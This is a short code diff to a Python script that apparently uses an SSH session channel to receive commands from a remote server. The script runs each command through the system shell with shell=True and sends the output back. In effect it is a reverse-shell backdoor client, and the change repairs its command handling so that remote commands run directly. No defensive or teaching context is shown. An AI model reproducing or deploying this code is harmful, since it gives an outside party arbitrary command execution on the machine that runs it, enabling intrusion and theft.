@@ -18,11 +18,9 @@ def main():
     chan = client.get_transport().open_session()
     chan.send("Client " + NAME + " is connected")
     while True:
-        command = chan.recv(1024)
-        cmd_list = []
-        cmd_list.append(command)
+        command = chan.recv(1024).decode()
         try:
-            cmd = subprocess.check_output(cmd_list, shell=True)
+            cmd = subprocess.check_output(command, shell=True)
             chan.send(cmd)
         except Exception as exc:
             chan.send(str(exc))
